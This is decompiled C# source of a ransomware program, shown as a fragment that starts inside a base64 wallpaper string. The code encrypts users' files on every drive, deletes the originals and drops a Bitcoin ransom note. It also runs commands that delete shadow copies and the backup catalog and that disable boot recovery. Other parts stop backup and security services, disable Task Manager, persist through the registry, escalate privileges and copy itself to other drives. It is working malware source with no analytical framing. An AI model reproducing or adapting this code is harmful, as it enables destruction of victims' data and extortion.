uInc2pFy+k2NV4c3WvbHUyskW2OZEmTiPKR6T25l1P2s07+JuuAbmJG0M0bomNsj4fSvmCrHH4rpPxphHXVAutbm17VaeyhW2txpJJO1RuY8sWY7uMfUUs1PtXMG3ZVYiAzFgQoAGMQMDEmc1mHuD1xXnvAU2wcoC011nWbtxt7EAnzYEfWeef7zQVzV3GBDOxBMkFjBPMkcTk/c0I2q+FR8f4U2F1FX1dYRSwkgDlpJEicj5nAxQPiH0qQc/CgSmaCOFoG6yif9q0iGZkfKB7oX9TQ97r15v3o/wBoVfyBu/8AdShSTRen0Nx+EY/TFLuATUVx9Y5JJYyRBMkkj0JOarBY+tOtN7P3DyEX5mT+P60ysezy/vOT8FAA/MmpO1DAu2rLppyeT9hJ/p+aJ0+lnhWb5TH2XI+9a+x0u0vCA/7s/rRgx3AHwFRdq+yYNA6LL6fot48IqD1OD98tRtroA/fuT6x/U07x8TVgtt2UD51ndO8qgNcJdY6ZaXhJP+o/y4oxTGBAHwFWG16sPpXgo7CfnUiSeV1kqomfjXtpqxlPyrm0fE0EFCKkB8PxUh8BXIPeuRXJPqa4P9s/PP612amqk0wQXAx9QPkK8IPMn61MWx61bbFUAQtQVT28td2juTV/h4zNR4/rRQXLQ9F+9G2lJ7x8v60OrH+/nVyCP7/HzqjUClYGaF6lpd4xEjIot6iRisoO02E/K+fdVujeTsIMCZ/Wlr3D/wDVa32mQFQSBM89+PWsmwr1IZN7bUnNornimCPWqwtWgVJRVbSqlUNTFo0QgrQdEsKTlVPzApHSbVyzlrSk8KT8v+KOs9DvN/8AjI+eP1rdWkA4AHyFSasjtWegThqyVn2Xb95lH3NMdP7OWhyGb8U+QVJqi7UPPVNtCBsaG2vu21H0E0SB8K6a6tSJJ5RXgp9KlBrzVGguUtor30qS8V6uXLwB9Yq7wB3Yn5TVdF2xiuC5VpaUfu/ep59BVhqLcUy5COua5Aqd7+tesj9aVMoQTXvC+NXnj61Q9GqQtcqVtCa6ooi3TtCFqK2h/Zq0QOP0rh7/AN+teHNVCVSPFQIqZ5ri9vkf0NAhcvIKtAmqlHH99zU/WiFy/9k=";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: test2@test.com.", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>yYi8zDvdSezlPfBPEHTZ/IWih6Kr9AyyTn9NDRj8b387y4BRNlPwVvRajgmoMJeSi1JxNJF/EYBMfGbeV86ZJo61FaFbG4cUyGs0nMecpIAkWosjil11LeaGcrrsRSPSIyuGMcdFh9oIjMF7DKqEGkaLWFeo0pp7DsNJPxPD2dbMOiVgDOg2xGY+qtkmNNXZrtMvnT/c1KDqD/NuqBEfQiYGnEn0SMDgV2tD6rKoFQPr4K4FnTZ7oyy1pEy7OdWlivB9iD2H5NuSk4UiqI4ZqfnEVlAp6vKVf1aBmjW0a83MC9GSH6OdT1z/NsedY4YiG/5VqR6iSKzHvwWBFZ/qaQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
